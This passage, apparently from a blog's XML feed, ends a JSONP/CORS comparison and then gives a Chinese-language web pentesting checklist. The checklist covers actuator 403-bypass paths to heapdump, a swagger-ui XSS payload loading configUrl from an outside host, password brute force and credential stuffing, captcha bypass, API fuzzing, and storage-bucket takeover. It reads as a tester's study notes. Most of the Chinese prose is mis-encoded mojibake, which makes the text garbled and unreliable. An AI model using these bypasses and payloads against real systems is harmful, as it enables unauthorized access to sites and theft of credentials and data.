&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è®¾ç½®<code>Access-Control-Allow-Origin</code></p><p><img src="/../images/image-20231005220636163.png" alt="image-20231005220636163"></p><p>è®¾ç½®<code>Access-Control-Allow-Origin</code>ä¸º<code>*</code>æ—¶</p><p><img src="/../images/image-20231005220734546.png" alt="image-20231005220734546"></p><p>è®¾ç½®<code>Access-Control-Allow-Origin</code>ä¸º<code>test.com</code>æ—¶</p><p><img src="/../images/image-20231005220817216.png" alt="image-20231005220817216"></p><h1 id="äºŒè€…åŒºåˆ«"><a href="#äºŒè€…åŒºåˆ«" class="headerlink" title="äºŒè€…åŒºåˆ«"></a>äºŒè€…åŒºåˆ«</h1><ul><li>JSONPæ˜¯æµè§ˆå™¨é»˜è®¤æ”¯æŒçš„è·¨åŸŸæ–¹å¼ï¼ˆè·¨åŸŸåŠ è½½javascriptï¼‰ï¼ŒCORSæ˜¯W3Cæä¾›çš„ä¸€ä¸ªè·¨åŸŸæ ‡å‡†</li><li>JSONPåªæ”¯æŒGETæ–¹æ³•ï¼ŒCORSå¯ä»¥è‡ªå®šä¹‰æ”¯æŒçš„æ–¹æ³•</li><li>JSONPå‡ ä¹æ”¯æŒæ‰€æœ‰çš„æµè§ˆå™¨ï¼ŒCORSä¸æ”¯æŒIE10ä¸‹çš„æµè§ˆå™¨</li><li>JSONPä¼ é€’çš„æ•°æ®è¦ç¬¦åˆJavaScriptä»£ç è§„èŒƒï¼ŒCORSå¯ä»¥æ˜¯htmlï¼Œxmlç­‰å¤šç§æ ¼å¼</li></ul><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>ã€ŠWebæ¼æ´è§£æä¸æ”»é˜²å®æˆ˜ã€‹</p><p><a href="http://drops.xmd5.com/static/drops/papers-6630.html">JSONPæŒ–æ˜ä¸é«˜çº§åˆ©ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pentest Note</title>
      <link href="/2023/08/03/%E5%B8%B8%E8%A7%81%E7%82%B9%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E7%BB%93/"/>
      <url>/2023/08/03/%E5%B8%B8%E8%A7%81%E7%82%B9%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h1><blockquote><p>TIPï¼šåå°å¤„æœ‰å¤šä¸ªæ¥å£ç³»ç»Ÿï¼Œå½“è®¿é—®ä¸åŒçš„æ¥å£ç³»ç»Ÿæ—¶å‘ç°ç½‘ç«™çš„å›¾æ ‡å‘ç”Ÿäº†å˜åŒ–ã€‚</p></blockquote><p><strong>è¿›å…¥åå°å‰</strong></p><ul><li><p>æ˜¯å¦ä¸ºçœŸå®IP</p></li><li><p>æŒ‡çº¹è¯†åˆ«æ‰“Nday</p></li><li><p>æœªæˆæƒè®¿é—®å’Œæƒé™ç»•è¿‡</p></li><li><p>æ•æ„Ÿä¿¡æ¯æ”¶é›†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APIç›¸å…³ï¼šsourcemapï¼ŒWebPack</span><br><span class="line">JSï¼šHAEï¼ŒSuperSearchPlusï¼ŒUrlfinderï¼Œæ‰‹åŠ¨æ„é€ </span><br><span class="line">æ–‡ä»¶/ç›®å½•æ‰«æï¼šå¤‡ä»½ï¼Œåå°ï¼Œå¤šçº§ç›®å½•ä¸‹é€’å½’æ‰«æ</span><br></pre></td></tr></table></figure></li><li><p>APIæ¥å£æµ‹è¯•</p></li><li><p>å¼±å£ä»¤</p></li><li><p>sqlæ³¨å…¥</p></li><li><p>é€»è¾‘æ¼æ´</p><ul><li>éªŒè¯ç é—®é¢˜</li><li>ç™»å½•ï¼Œæ³¨å†Œï¼Œä¿®æ”¹å¯†ç é—®é¢˜</li></ul></li><li><p>å…¶ä»–ç›¸åŒç«™ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŒ‡çº¹æå–ï¼Œæ‰¾åˆ°ç›¸åŒç«™ç‚¹ï¼Œç†æƒ³æƒ…å†µå¼±å£ä»¤è¿›å…¥åå°ï¼Œæ‰¾æœªæˆæƒè®¿é—®å’Œæ‹¿æºç å®¡è®¡</span><br></pre></td></tr></table></figure></li><li><p>æ—ç«™</p></li></ul><p><strong>è¿›å…¥åå°å</strong></p><ul><li><p>ç™»å½•ç”¨æˆ·æƒé™æ˜¯å¦ä¸ºåå°ç®¡ç†å‘˜</p></li><li><p>è¶Šæƒï¼Œæœªæˆæƒ</p></li><li><p>sqlæ³¨å…¥</p></li><li><p>æ–‡ä»¶ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¤´åƒä¸Šä¼ ï¼Œæ¨¡æ¿æ–‡ä»¶ä¿®æ”¹ï¼Œæ’ä»¶ä¸‹è½½ï¼Œæ–‡ä»¶ç®¡ç†å™¨ã€‚ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥æ‰¾ä¸€ä¸‹å“ªé‡Œå¯ä»¥ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶çš„é…ç½®ï¼Œç„¶åå…è®¸è„šæœ¬æ–‡ä»¶ä¸Šä¼ </span><br><span class="line">çœ‹åˆ°ä¸€ä¸ªæœ‰æ„æ€çš„æ–‡ç« ï¼Œå°±æ˜¯å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä¿å­˜åœ¨æ•°æ®åº“ä¸­çš„è¡¨ä¸­ï¼Œè¡¨åç±»ä¼¼äºallow*ï¼Œconfig*ï¼Œsetting*ç­‰ï¼Œå¯ä»¥é€šè¿‡sqlæ³¨å…¥æ‰¾åˆ°å¯¹åº”çš„è¡¨æ·»åŠ è„šæœ¬åç¼€ï¼Œç„¶åå°±å¯ä»¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶äº†</span><br></pre></td></tr></table></figure></li><li><p>å­˜å‚¨XSS</p></li><li><p>æ•æ„Ÿä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å„ç§é…ç½®ä¿¡æ¯</span><br></pre></td></tr></table></figure></li></ul><h1 id="403ï¼Œ404"><a href="#403ï¼Œ404" class="headerlink" title="403ï¼Œ404"></a>403ï¼Œ404</h1><p><strong>é€çº§ç›®å½•fuzz</strong></p><p>TIPï¼šç›®å½•å¯èƒ½ä¸ºåŸŸåçš„ä¸€éƒ¨åˆ†ï¼Œå…¬å¸çš„ç¼©å†™ï¼Œapiï¼Œxxx-apiç­‰</p><p><strong>403bypass</strong></p><ul><li><p>Springï¼ŒShiroæƒé™ç»•è¿‡</p><p><a href="https://github.com/0x727/BypassPro">0x727&#x2F;BypassPro: å¯¹æƒé™ç»•è¿‡è‡ªåŠ¨åŒ–bypassçš„burpsuiteæ’ä»¶ (github.com)</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">403 /actuator/heapdump</span><br><span class="line">200 /actuator/heapdump;.js</span><br><span class="line"></span><br><span class="line">403 /actuator/httptrace</span><br><span class="line">200 /actuator/httptrace/# (burpæŠ“åŒ…æ”¹)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶ä»–ç‰¹æ®Šæƒ…å†µ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">404 /sys/actuator </span><br><span class="line">200 /sys/..;/actuator </span><br><span class="line">200 /sys/;/actuator</span><br></pre></td></tr></table></figure><p>å¾ˆå¤šæ—¶å€™è®¿é—®actuatorï¼Œä¸ä¼šæ˜¾ç¤ºç«¯ç‚¹ï¼Œä½†æ˜¯è®¿é—®å…·ä½“çš„ç«¯ç‚¹æ˜¯å¯ä»¥è®¿é—®åˆ°çš„ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è®¿é—®mappingsç«¯ç‚¹æ¥æŸ¥çœ‹å­˜åœ¨å“ªäº›ç«¯ç‚¹</p></li><li><p>burpfakeIP</p><p><img src="/../images/image-20230911095606358.png?lastModify=1695029992" alt="image-20230911095606358"></p><p>  <img src="/../images/image-20230911095617521.png?lastModify=1695029992" alt="image-20230911095617521"></p></li></ul><h1 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h1><ul><li><p>èƒ½æšä¸¾ç”¨æˆ·åå°±å…ˆæšä¸¾</p></li><li><p>å¯ä»¥çœ‹ä¸€ä¸‹å¯†ç çš„å¤æ‚åº¦è¦æ±‚æ¥ç”Ÿæˆå¯¹åº”å­—å…¸</p></li><li><p>å›¾ç‰‡éªŒè¯ç ç»•è¿‡</p><ul><li><p>éªŒè¯ç æ˜¯å¦å¤±æ•ˆ</p></li><li><p>burpæ’ä»¶è¯†åˆ«</p></li></ul></li><li><p>æ•°æ®åŒ…åŠ å¯†</p><ul><li><p>ç ´è§£</p><p><a href="https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">å¿«é€Ÿå®šä½å‰ç«¯åŠ å¯†æ–¹æ³• | å›å¿†é£˜å¦‚é›ª</a></p><p><a href="https://blog.wanghw.cn/security/burpcrypto-single-parameter-cryptoblast.html">BurpCrypto: å¯¹å•åŠ å¯†å‚æ•°çš„ç™»å½•æ¥å£è¿›è¡Œå¯†ç çˆ†ç ´çš„ä¸€ç§æ–¹æ³• â€“ Whwlsfbâ€™s Tech Blog</a></p></li><li><p>è¾“å…¥ä¸€äº›å¸¸è§çš„å¼±å£ä»¤ï¼Œæ”¶é›†åŠ å¯†åçš„å€¼ï¼Œç„¶åå›ºå®šå¯†ç ï¼Œçˆ†ç ´ç”¨æˆ·å</p></li><li><p>ä½¿ç”¨seleniumæ¨¡å—æ¨¡æ‹Ÿæ‰‹åŠ¨æäº¤ç»•è¿‡</p></li></ul></li><li><p>åŒä¸€ä¸ªå…¬å¸çš„ç«™ç‚¹çš„è´¦å·å’Œå¯†ç ç”¨äºæ’åº“</p></li><li><p>ç¤¾å·¥å­—å…¸ç”Ÿæˆ</p><p>éœ€è¦å…ˆæ”¶é›†ä¸€ä¸‹é‚®ç®±ï¼Œå…¬å¸åï¼Œå·¥å·ï¼Œç½‘ç«™æ–‡ç« çš„ä½œè€…åç­‰ä¿¡æ¯</p></li><li><p>é’ˆå¯¹ä¸åŒè¡Œä¸šï¼Œå­˜åœ¨çš„ç”¨æˆ·å¾ˆå¤šéƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥å»äº†è§£ä¸€äº›è¡Œä¸šé»‘è¯</p></li><li><p>å¦‚æœå­˜åœ¨é‚€è¯·ç ï¼Œå¯ä»¥å°è¯•ä¸€äº›ç‰¹æ®Šçš„æ•°å­—ç»„åˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">666</span><br><span class="line">666666</span><br><span class="line">888</span><br><span class="line">888888</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></li></ul><h1 id="APIæ¥å£"><a href="#APIæ¥å£" class="headerlink" title="APIæ¥å£"></a>APIæ¥å£</h1><blockquote><p>TIPï¼šå¾ˆå¤šAPIæ¥å£æ–‡æ¡£éƒ½è—åœ¨äºŒçº§ï¼Œä¸‰çº§ï¼Œå››çº§ç”šè‡³äº”çº§ç›®å½•ä¸‹ï¼ˆdruidä»€ä¹ˆçš„ä¹Ÿæ˜¯ï¼‰ï¼Œæ¨èä½¿ç”¨burpè¢«åŠ¨æ‰«æï¼Œæ‰«æå‡ºæ¥åå¯ä»¥ä½¿ç”¨å·¥å…·æˆ–è€…æ‰‹å·¥è¿›è¡Œæ¥å£æµ‹è¯•</p><p>APIkitï¼šä¸èƒ½ä½¿ç”¨åŸå§‹è¯·æ±‚å¤´ï¼Œåªä¿ç•™äº†Cookieï¼Œè¢«åŠ¨æ‰«æä¸èƒ½å…³é—­</p><p>Routevulscanï¼šä¸èƒ½æ§åˆ¶æ‰«æå±‚æ•°ï¼Œbypassæœ‰ç‚¹é—®é¢˜</p><p>onescanï¼šé«˜åº¦è‡ªå®šä¹‰ï¼Œç¼ºå°‘bypass</p><p>æˆ‘è¿™é‡Œé€‰æ‹©onescan+è‡ªå®šä¹‰bypasså­—å…¸ï¼Œç„¶åå¯ä»¥ç”¨APIkitæ¥æµ‹è¯•æ¥å£</p></blockquote><h2 id="åŸºæœ¬æµç¨‹"><a href="#åŸºæœ¬æµç¨‹" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h2><p><strong>æ”¶é›†æ¥å£</strong></p><ul><li><p>æ‰¾ä¸€æ‰¾æ³„æ¼çš„æ¥å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³„æ¼çš„apiæ–‡æ¡£ï¼Œæ¯”å¦‚swaggeræ¥å£æ–‡æ¡£</span><br><span class="line">ç›®æ ‡å…¬å¸çš„å¼€å‘è€…å¹³å°</span><br><span class="line">SourceMap</span><br></pre></td></tr></table></figure></li><li><p>supersearchplus</p></li><li><p>urlfinder</p></li><li><p>HAEè¢«åŠ¨æ”¶é›†ï¼ˆè¿›è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚ç™»å½•ä»€ä¹ˆçš„ï¼‰</p></li></ul><p><strong>æ”¶é›†å®Œåï¼Œç¡®å®šå¥½BaseDir</strong></p><p><strong>æµ‹è¯•å·¥å…·</strong></p><ul><li>ReadyAPI</li><li>packerfuzzer</li><li>swagger-exp</li><li>supersearchplus</li><li>è”åŠ¨xray</li></ul><p><strong>å¸¸è§æµ‹è¯•ç‚¹</strong></p><ul><li><p>ç‰¹å®šçš„æ¥å£ï¼šæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ æ¥å£</p></li><li><p>è¶Šæƒ</p></li><li><p>sqlæ³¨å…¥</p></li><li><p>æœªæˆæƒè®¿é—®</p></li><li><p>é‰´æƒçš„æ•°æ®ï¼Œå¦‚JWT</p></li><li><p>åç«¯ç»„ä»¶æ¼æ´ï¼šå¦‚fastjsonï¼Œlog4j</p></li><li><p>å“åº”æ•°æ®åŒ…ä¿¡æ¯æ³„æ¼ï¼šæ•æ„Ÿä¿¡æ¯ï¼Œç»„ä»¶ç‰ˆæœ¬å·ï¼Œå‚æ•°æ³„æ¼</p></li><li><p>FUZZ</p><ul><li>é€šè¿‡å·²çŸ¥çš„æ¥å£ï¼ŒçŒœæµ‹æœªçŸ¥æ¥å£ï¼Œå¦‚çœ‹åˆ°imageUploadå¯ä»¥è¯•è¯•fileUpload</li><li>çˆ†ç ´æ¥å£å‚æ•°</li><li>ç›®å½•æ‰«æ</li></ul></li></ul><h2 id="Swaggeræ¥å£TIPS"><a href="#Swaggeræ¥å£TIPS" class="headerlink" title="Swaggeræ¥å£TIPS"></a>Swaggeræ¥å£TIPS</h2><ul><li><p>swagger-uiç•Œé¢çš„xss</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json</span><br><span class="line">swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json</span><br></pre></td></tr></table></figure></li><li><p>æ¥å£æ–‡æ¡£å¯èƒ½ä¸æ­¢ä¸€ä¸ªâ€“<code>swagger-resources</code></p><p><img src="/../images/image-20230905205724346.png?lastModify=1695029992" alt="image-20230905205724346"></p></li><li><p>åªæœ‰æ¥å£æ–‡æ¡£ï¼Œæ²¡æœ‰swagger-ui</p><p>å°†æ¥å£æ–‡æ¡£å¯¼å…¥æµè§ˆå™¨æ’ä»¶swagger-ui</p></li><li><p>æ¥å£æ–‡æ¡£å†…å®¹é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostä¸ºå†…ç½‘ip</span><br><span class="line">basePathé”™è¯¯</span><br><span class="line">schemesé”™è¯¯ï¼Œå¦‚ç½‘ç«™ä½¿ç”¨httpsï¼Œæ¥å£æ–‡æ¡£ä½¿ç”¨http</span><br><span class="line">æ¥å£æ–‡æ¡£æ²¡æœ‰é‰´æƒçš„headerå¤´</span><br></pre></td></tr></table></figure><p>swaggeræ¥å£æ–‡æ¡£ç¤ºä¾‹</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;swagger&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;æ¥å£æ–‡æ¡£æ ‡é¢˜&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;api.example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;basePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;schemes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;http&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;securityDefinitions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">       <span class="attr">&quot;bearerAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;apiKey&quot;</span><span class="punctuation">,</span> </span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Authorization&quot;</span><span class="punctuation">,</span> # nameè¦çœ‹å®é™…çš„é‰´æƒå¤´</span><br><span class="line">           <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="string">&quot;header&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;bearerAuth&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>xxx<span class="punctuation">]</span>  # xxxä¸ºé‰´æƒæ•°æ®</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;/users&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;è·å–ç”¨æˆ·åˆ—è¡¨&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ç”¨äºè·å–æ‰€æœ‰ç”¨æˆ·çš„åˆ—è¡¨ä¿¡æ¯&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;æˆåŠŸå“åº”&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;definitions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;User&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œæˆåï¼Œä½¿ç”¨swagger-expæµ‹è¯•å³å¯</p></li></ul><h2 id="ReadApiä½¿ç”¨"><a href="#ReadApiä½¿ç”¨" class="headerlink" title="ReadApiä½¿ç”¨"></a>ReadApiä½¿ç”¨</h2><p><img src="/../images/image-20230829114309049.png?lastModify=1695029992" alt="image-20230829114309049"></p><p>æ‰«æå®Œæˆåï¼Œä¼šç”ŸæˆPDFæŠ¥å‘Š</p><p><img src="/../images/image-20230829114529740.png?lastModify=1695029992" alt="image-20230829114529740"></p><p><img src="/../images/image-20230829114701973.png?lastModify=1695029992" alt="image-20230829114701973"></p><h1 id="å­˜å‚¨æ¡¶"><a href="#å­˜å‚¨æ¡¶" class="headerlink" title="å­˜å‚¨æ¡¶"></a>å­˜å‚¨æ¡¶</h1><p><img src="/../images/68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d61676525453525423925424225453725383125414625453725383925383732392e7.png" alt="68747470733a2f2f757a6a756d616b646f776e2d313235363139303038322e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f557a4a754d61726b446f776e496d61676525453525423925424225453725383125414625453725383925383732392e7"></p><blockquote><p>æ„Ÿè§‰ç¢°åˆ°æ¯”è¾ƒå¤šçš„æ˜¯éå†ï¼Œputä¸Šä¼ å’ŒAKSKæ³„æ¼</p></blockquote><ul><li><p>Bucket çˆ†ç ´ï¼šInvalidBucketName</p></li><li><p>Bucket æ¥ç®¡ï¼šNoSuchBucket</p><p>ç±»ä¼¼äºå­åŸŸåæ¥ç®¡ï¼Œåªæ˜¯cnameæŒ‡å‘çš„æ˜¯Bucket</p><p><img src="/../images/f8c5eeb73755688f1aaa2701080ea3a6.png?lastModify=1695029992" alt="WeiyiGeek."></p><blockquote><p>å› ä¸ºåŸŸåï¼ˆæºåŸŸåï¼‰é…ç½®äº†CNAMEï¼Œä½†æ˜¯CNAMEæŒ‡å‘çš„åŸŸåå¹¶æ²¡æœ‰è¢«æ³¨å†Œã€‚é‚£ä¹ˆæ”»å‡»è€…å¯ä»¥æ³¨å†Œè¿™ä¸ªCNAMEæŒ‡å‘çš„åŸŸåï¼Œå°±å¯ä»¥æ§åˆ¶äº†æºåŸŸåã€‚</p><p>å› ä¸ºåŸŸåé…ç½®äº†CNAMEï¼Œä½†æ˜¯CNAMEæŒ‡å‘çš„Bucketæ²¡æœ‰è¢«æ³¨å†Œï¼ˆè¢«åˆ é™¤äº†ï¼‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥æ³¨å†Œè¿™ä¸ªCNAMEæŒ‡å‘çš„Bucketï¼Œä»è€Œæ¥ç®¡è¯¥åŸŸåã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://kebingzao.com/2021/06/21/s3-subdomain-takeover/">è®°ä¸€æ¬¡å› ä¸º S3 bucket åˆ é™¤è€Œå¯¼è‡´çš„å­åŸŸåæ¥ç®¡(subdomain takeover)çš„å®‰å…¨é—®é¢˜ | Zach Keâ€™s Notes (kebingzao.com)</a></p></blockquote></li><li><p>Buckeéå†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ossx-mainçˆ¬å–é“¾æ¥</span><br><span class="line">wgetæ‰¹é‡ä¸‹è½½</span><br></pre></td></tr></table></figure></li><li><p>PUTä¸Šä¼ æ–‡ä»¶</p></li><li><p>ç­–ç•¥å¯è®¿é—®&#x2F;ä¿®æ”¹ï¼ˆ&#x2F;?aclï¼‰</p></li></ul><p>å¯ä»¥å…³æ³¨ä¸€ä¸‹é™æ€æ–‡ä»¶æ˜¯ä¸æ˜¯<strong>ä»å…¶ä»–åŸŸåå¼•å…¥çš„</strong>ï¼Œä¸€èˆ¬ä»å…¶ä»–åŸŸåå¼•å…¥çš„å°±æ˜¯ä»å­˜å‚¨æ¡¶å¼•å…¥çš„ã€‚</p><p>è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯è—åœ¨å¤šçº§ç›®å½•ä¸‹ï¼Œæ¯”å¦‚<code>/minio/picture/</code></p><h1 id="é€»è¾‘æ¼æ´â€“ä¸šåŠ¡å®‰å…¨"><a href="#é€»è¾‘æ¼æ´â€“ä¸šåŠ¡å®‰å…¨" class="headerlink" title="é€»è¾‘æ¼æ´â€“ä¸šåŠ¡å®‰å…¨"></a>é€»è¾‘æ¼æ´â€“ä¸šåŠ¡å®‰å…¨</h1><blockquote><p>ä¸šåŠ¡å¤§äºå®‰å…¨ï¼Œå®‰å…¨åªæ˜¯é”¦ä¸Šæ·»èŠ±ç½¢äº†ã€‚ã€‚</p></blockquote><h2 id="ä¸šåŠ¡æ¢³ç†â€“å¾…åš"><a href="#ä¸šåŠ¡æ¢³ç†â€“å¾…åš" class="headerlink" title="ä¸šåŠ¡æ¢³ç†â€“å¾…åš"></a><strong>ä¸šåŠ¡æ¢³ç†</strong>â€“å¾…åš</h2><p>å¯ä»¥å…ˆå°†ä¸šåŠ¡ä¸»ä½“åˆ’åˆ†ä¸ºå‡ ä¸ªå¤§æ¨¡å—ï¼Œå†å°†æ¯ä¸ªå¤§æ¨¡å—é€ä¸ªç»†åˆ†ä¸ºå­æ¨¡ å—ã€‚</p><p>å¯ä»¥ä»è´¦å·ä½“ç³»å¼€å§‹ï¼Œå¦‚ç”¨æˆ·çš„æ³¨å†Œã€ç™»å½•ã€å¯†ç æ‰¾å›ã€ä¿¡æ¯å­˜å‚¨ç­‰ã€‚</p><p>å†åˆ°å…·ä½“çš„ä¸š åŠ¡åŠç†ï¼Œå¦‚å•†å“çš„æœç´¢ã€é€‰æ‹©ã€æ”¯ä»˜ã€ç”Ÿæˆè®¢å•ï¼Œä»¥åŠè®¢å•æŸ¥è¯¢å’Œç”¨æˆ·è¯„è®ºç­‰ã€‚</p><p><img src="/../images/image-20230713141756097.png?lastModify=1695029992" alt="image-20230713141756097"></p><p>â€‹å†æ ¹æ®ä¸šåŠ¡åœºæ™¯æ¢³ç†å‡ºæµç¨‹å›¾</p><p><img src="/../images/image-20230713141918648.png?lastModify=1695029992" alt="image-20230713141918648"></p><p><img src="/../images/image-20230713134331110.png?lastModify=1695029992" alt="image-20230713134331110"></p><p><strong>æµ‹è¯•æ–¹æ³•</strong></p><p><img src="/../images/image-20230713134200584.png?lastModify=1695029992" alt="image-20230713134200584"></p><h2 id="å…³äºè®¿é—®æ§åˆ¶"><a href="#å…³äºè®¿é—®æ§åˆ¶" class="headerlink" title="å…³äºè®¿é—®æ§åˆ¶"></a>å…³äºè®¿é—®æ§åˆ¶</h2><p>ç”¨æˆ·è®¿é—®æ¥å£â†’ç”¨æˆ·æ˜¯å¦åˆæ³•ï¼ˆè®¤è¯ï¼‰â†’ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰æƒé™ï¼ˆæˆæƒï¼šæƒé™æ§åˆ¶å’Œè§’è‰²æ§åˆ¶ï¼‰â†’ æ¥å£è¿”å›æ•°æ®</p><ul><li><p>è®¤è¯</p><p>è®¤è¯å°±æ˜¯åˆ¤æ–­ä½ è¿™ä¸ªç”¨æˆ·æ˜¯ä¸æ˜¯åˆæ³•ç”¨æˆ·ï¼Œä»–æ˜¯ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªè®¤è¯çš„è¿‡ç¨‹ã€‚</p></li><li><p>æˆæƒ</p><p>æˆæƒå…¶å®å°±æ˜¯ä½ è®¤è¯æˆåŠŸä¹‹åï¼Œä½ 